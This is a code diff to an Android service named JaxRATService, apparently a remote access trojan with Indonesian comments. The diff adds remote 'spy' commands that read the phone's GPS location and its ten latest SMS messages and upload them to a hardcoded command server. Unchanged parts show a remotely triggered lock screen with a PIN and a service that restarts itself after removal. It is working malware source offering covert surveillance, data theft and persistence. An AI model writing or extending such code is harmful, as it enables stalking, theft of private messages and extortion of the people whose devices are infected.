@@ -8,20 +8,32 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraCharacteristics;
 import android.hardware.camera2.CameraManager;
+import android.location.Location;
+import android.location.LocationManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.SystemClock;
+import android.telephony.Sms;
+import android.util.Log;
+import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
+import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.ArrayList;
+import java.util.List;
 
 public class JaxRATService extends Service {
     private static final String SERVER_URL = "http://192.168.1.54:5000"; 
@@ -102,8 +114,8 @@ public class JaxRATService extends Service {
                 Intent intent = new Intent(this, LockScreenActivity.class);
                 intent.putExtra("TIMER", Long.parseLong(parts[1].trim()));
                 intent.putExtra("SUARA", parts[2].trim());
-                intent.putExtra("GETAR", parts[3].trim()); // Ambil data Getar
-                intent.putExtra("VOLUME", parts[4].trim()); // Ambil data Volume
+                intent.putExtra("GETAR", parts[3].trim());
+                intent.putExtra("VOLUME", parts[4].trim());
                 intent.putExtra("PESAN", parts[5].trim());
                 intent.putExtra("PIN", parts[6].trim());
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -118,7 +130,88 @@ public class JaxRATService extends Service {
             Intent broadcastIntent = new Intent("UNLOCK_SCREEN_ACTION");
             broadcastIntent.setPackage(getPackageName());
             sendBroadcast(broadcastIntent);
+        } 
+        // --- LOGIKA SPY BARU ---
+        else if (cmd.equals("get_gps")) {
+            ambilGps();
+        } else if (cmd.equals("get_sms")) {
+            ambilSms();
         }
+    }
+
+    // --- FUNGSI AMBIL GPS ---
+    private void ambilGps() {
+        try {
+            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
+            
+            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            
+            String koordinat = "Lokasi tidak ditemukan";
+            if (loc != null) {
+                koordinat = loc.getLatitude() + ", " + loc.getLongitude();
+            }
+            
+            kirimHasilKeWeb("gps", koordinat);
+
+        } catch (Exception e) {
+            Log.e("JAXRAT", "Gagal ambil GPS", e);
+        }
+    }
+
+    // --- FUNGSI AMBIL 10 SMS TERAKHIR ---
+    private void ambilSms() {
+        try {
+            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;
+            
+            JSONArray smsArray = new JSONArray();
+            Uri uriSms = Uri.parse("content://sms/inbox");
+            Cursor cursor = getContentResolver().query(uriSms, null, null, null, "date DESC LIMIT 10");
+            
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
+                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                    
+                    JSONObject sms = new JSONObject();
+                    sms.put("address", address);
+                    sms.put("body", body);
+                    smsArray.put(sms);
+                } while (cursor.moveToNext());
+                cursor.close();
+            }
+            
+            kirimHasilKeWeb("sms", smsArray);
+
+        } catch (Exception e) {
+            Log.e("JAXRAT", "Gagal ambil SMS", e);
+        }
+    }
+
+    // --- FUNGSI KIRIM DATA KE WEB ---
+    private void kirimHasilKeWeb(String type, Object data) {
+        new Thread(() -> {
+            try {
+                URL url = new URL(SERVER_URL + "/api/upload_result/" + DEVICE_ID);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+
+                JSONObject json = new JSONObject();
+                json.put("type", type);
+                json.put("data", data);
+
+                try (OutputStream os = conn.getOutputStream()) {
+                    byte[] input = json.toString().getBytes("utf-8");
+                    os.write(input, 0, input.length);
+                }
+                conn.getResponseCode();
+            } catch (Exception e) {
+                Log.e("JAXRAT", "Gagal upload hasil", e);
+            }
+        }).start();
     }
 
     private void setTorch(boolean state) {
@@ -151,9 +244,7 @@ public class JaxRATService extends Service {
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel serviceChannel = new NotificationChannel(
-                    CHANNEL_ID, "JaxRAT Service", NotificationManager.IMPORTANCE_LOW
-            );
+            NotificationChannel serviceChannel = new NotificationChannel(CHANNEL_ID, "JaxRAT Service", NotificationManager.IMPORTANCE_LOW);
             NotificationManager manager = getSystemService(NotificationManager.class);
             manager.createNotificationChannel(serviceChannel);
         }
@@ -177,8 +268,7 @@ public class JaxRATService extends Service {
     public void onTaskRemoved(Intent rootIntent) {
         Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
         restartServiceIntent.setPackage(getPackageName());
-        PendingIntent restartServicePendingIntent = PendingIntent.getService(
-                getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
+        PendingIntent restartServicePendingIntent = PendingIntent.getService(getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
         AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
         if (alarmService != null) {
             alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
